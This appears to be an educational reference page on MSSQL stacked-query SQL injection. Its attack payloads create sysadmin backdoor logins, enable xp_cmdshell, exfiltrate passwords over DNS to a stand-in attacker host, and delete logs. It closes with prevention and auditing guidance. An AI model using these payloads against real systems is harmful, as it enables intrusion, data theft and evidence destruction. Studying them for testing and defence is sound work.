---
title: Stacked Queries
description: Using multiple SQL statements in a single MSSQL injection
category: Advanced Techniques
order: 15
tags: ["stacked queries", "multiple statements", "batch injection"]
lastUpdated: 2026-10-08
---

Stacked queries (also known as batch queries or query stacking) allow attackers to execute multiple SQL statements in a single injection. This technique significantly expands the capabilities of SQL injection attacks in Microsoft SQL Server, enabling operations beyond simple data extraction.

## Basic Syntax

In SQL Server, multiple SQL statements can be separated by semicolons (`;`):

```sql
SELECT * FROM users; DROP TABLE logs;
```

This executes two separate queries: first selecting data, then dropping a table. The `;` is optional in T-SQL (`SELECT 1 SELECT 2` is also two statements), but it makes the payload clearer.

## How Stacked Queries Work

SQL Server accepts several statements in one batch, and the common drivers (ADO.NET `SqlClient`, ODBC, OLE DB, PHP `sqlsrv` and PDO, JDBC) send the whole query text as one batch, so stacked queries usually work against MSSQL. SQL Server executes each statement sequentially. Only the first result set is usually displayed by the application, so stacked queries are mostly used for their side effects or with blind and out-of-band techniques. Stacked queries allow an attacker to:

1. Execute the original query (possibly modified)
2. Add a statement terminator (`;`)
3. Add additional SQL statements
4. Comment out any remaining code (`--`)

## Detection Testing

To test if stacked queries are possible (string context; for a numeric parameter drop the leading quote):

```sql
' ; SELECT 1 --
' ; WAITFOR DELAY '0:0:5' --
```

If the application pauses for 5 seconds with the second payload, it likely supports stacked queries.

## Common Attack Patterns

### Data Modification

```sql
-- Update data
' ; UPDATE users SET password='hacked' WHERE username='admin' --

-- Insert data
' ; INSERT INTO users (username, password, role) VALUES ('hacker', 'backdoor', 'admin') --

-- Delete data
' ; DELETE FROM logs WHERE created_at < GETDATE() --
```

### Schema Modification

```sql
-- Add column
' ; ALTER TABLE users ADD notes VARCHAR(100) --

-- Create new table
' ; CREATE TABLE backdoor (id INT IDENTITY(1,1), command VARCHAR(8000)) --

-- Drop table
' ; DROP TABLE sensitive_data --
```

### Administrative Operations

`CREATE LOGIN` needs `ALTER ANY LOGIN`, but adding a member to a fixed server role such as `sysadmin` needs membership in that role (`CONTROL SERVER` and `ALTER ANY SERVER ROLE` are not enough). `ALTER SERVER ROLE ... ADD MEMBER` is SQL Server 2012+:

```sql
-- Create a SQL login and add it to sysadmin (SQL Server 2012+; sp_addlogin and
-- sp_addsrvrolemember still work but are deprecated)
' ; CREATE LOGIN backdoor WITH PASSWORD = 'P@ssw0rd!2026'; ALTER SERVER ROLE sysadmin ADD MEMBER backdoor --

-- Enable xp_cmdshell
' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE --
```

### Executing System Commands

`xp_cmdshell` needs `sysadmin` (or a proxy account) and must be enabled; SQL Agent jobs need the Agent service running, and `CmdExec` steps need `sysadmin` or a proxy. Commands run as the SQL Server or SQL Agent service account. See [System Command Execution](/mssql/system-command-execution).

```sql
-- Using xp_cmdshell (if enabled)
' ; EXEC xp_cmdshell 'whoami' --

-- Using a SQL Agent job; sp_add_jobserver assigns the job to the local server, without it the job never runs
' ; EXEC msdb.dbo.sp_add_job @job_name='kb_job';
EXEC msdb.dbo.sp_add_jobstep @job_name='kb_job', @step_name='exec', @subsystem='CMDEXEC', @command='whoami';
EXEC msdb.dbo.sp_add_jobserver @job_name='kb_job';
EXEC msdb.dbo.sp_start_job 'kb_job' --
```

### Information Gathering

SQL Server has no `SELECT ... INTO OUTFILE` (that is MySQL); writing query results to a file needs `xp_cmdshell` with `bcp` or similar, see [Writing Files](/mssql/writing-files).

`xp_dirtree` with a UNC path makes the server resolve a host name, which leaks data through DNS to a domain you control. Procedure arguments must be constants or variables, so build the path in a variable first. This needs Windows and outbound DNS; the value must be valid in a host name (letters, digits, hyphens, at most 63 characters per label), so hex-encode arbitrary data:

```sql
' ; DECLARE @q VARCHAR(1024); SET @q = '\\' + (SELECT TOP 1 password FROM users WHERE username='admin') + '.attacker.example\share'; EXEC master..xp_dirtree @q --
```

## Advanced Techniques

### Dynamic SQL Execution

```sql
-- Using EXEC to run dynamic SQL
' ; DECLARE @sql NVARCHAR(100); SET @sql = 'SELECT * FROM ' + 'users'; EXEC(@sql) --

-- Using sp_executesql for parameterized dynamic SQL
' ; EXEC sp_executesql N'SELECT * FROM users WHERE username = @user', N'@user NVARCHAR(50)', @user = 'admin' --
```

### Transaction Manipulation

```sql
-- Handling transactions
' ; BEGIN TRANSACTION; UPDATE accounts SET balance = balance + 1000 WHERE id = 1; COMMIT --

-- Rollback changes if there's an error
' ; BEGIN TRY BEGIN TRANSACTION; UPDATE accounts SET balance = balance + 1000 WHERE id = 1; COMMIT; END TRY BEGIN CATCH ROLLBACK; END CATCH --
```

### Error Handling

```sql
-- Using TRY...CATCH so a failing step does not abort the batch
' ; BEGIN TRY EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; END TRY BEGIN CATCH END CATCH; EXEC xp_cmdshell 'whoami' --
```

### Conditional Execution

```sql
-- Using IF statements for conditional execution
' ; IF OBJECT_ID('sensitive_data') IS NOT NULL BEGIN SELECT * FROM sensitive_data END --
```

## Real-World Impact Examples

### Data Theft

```sql
-- Return credentials as a second result set (visible only if the application reads all result sets)
' ; SELECT username, password, email FROM users --
```

### Backdoor Creation

```sql
-- Create persistent access
' ; IF NOT EXISTS (SELECT * FROM users WHERE username = 'backdoor')
BEGIN
  INSERT INTO users (username, password, role) VALUES ('backdoor', 'h4ck3d!', 'admin')
END --
```

### Evidence Removal

```sql
-- Clean up traces
' ; DELETE FROM logs WHERE message LIKE '%login%'; UPDATE logs SET created_at = DATEADD(day, -30, created_at) --
```

## Prevention Techniques

To prevent stacked query attacks:

1. Use parameterized queries consistently (stored procedures only help if they do not build dynamic SQL from their parameters)

   **Note:** ORMs like Entity Framework Core protect against SQL injection (including stacked queries) by using parameterized queries by default. There is no connection-level or batching setting that prevents stacked queries—the protection comes entirely from parameterization.

   For raw ADO.NET with `SqlClient`, **connection-level settings do not prevent stacked queries**. Stacked query prevention relies entirely on **never constructing `CommandText` from untrusted input**. Always use parameterized `SqlCommand` parameters so that injected semicolons or SQL fragments in parameter values are treated only as literal data, not as executable SQL:

   ```csharp
   // SAFE: User input passed as parameter (semicolons are data, not SQL)
   using (SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE id = @id", conn))
   {
       cmd.Parameters.AddWithValue("@id", userInput);
       // Even if userInput = "1; DROP TABLE users--", it's treated as a literal string
   }

   // UNSAFE: User input concatenated into SQL (vulnerable to stacked queries)
   string sql = "SELECT * FROM users WHERE id = " + userInput;
   // If userInput = "1; DROP TABLE users--", both statements execute
   ```

2. Apply the principle of least privilege for database accounts (no `sysadmin`, no DDL rights for the application login)

3. Validate input against an allowlist (e.g. numeric IDs, known column names); blocklists are easy to bypass

4. Consider using ORMs that protect against SQL injection by design

## Defensive Implementation Examples

```csharp
// C# - Parameterized query (safe)
using (SqlConnection conn = new SqlConnection(connectionString))
{
    SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE username = @username", conn);
    cmd.Parameters.AddWithValue("@username", userInput);
    // ...
}
```

```php
// PHP (PDO with the sqlsrv driver) - Prepared statement (safe)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$userInput]);
```

```javascript
// Node.js (mssql package) - Parameterized query (safe)
const result = await pool
  .request()
  .input("username", sql.NVarChar, userInput)
  .query("SELECT * FROM users WHERE username = @username");
```

## Detection and Response

To detect stacked query attacks:

1. Monitor for queries with multiple statement separators (`;`)
2. Look for schema modification statements in application contexts
3. Implement database activity monitoring
4. Set up auditing for sensitive operations:

```sql
-- Set up SQL Server auditing (server audit in master, specification in the application database)
CREATE SERVER AUDIT SecurityAudit TO FILE (FILEPATH = 'C:\SQLAudit\');
ALTER SERVER AUDIT SecurityAudit WITH (STATE = ON);
-- Database audit specifications: Enterprise edition before 2016 SP1, all editions since
CREATE DATABASE AUDIT SPECIFICATION DbAuditSpec FOR SERVER AUDIT SecurityAudit
ADD (DATABASE_OBJECT_CHANGE_GROUP),
ADD (SELECT, UPDATE, INSERT, DELETE ON SCHEMA::dbo BY public)
WITH (STATE = ON);
```
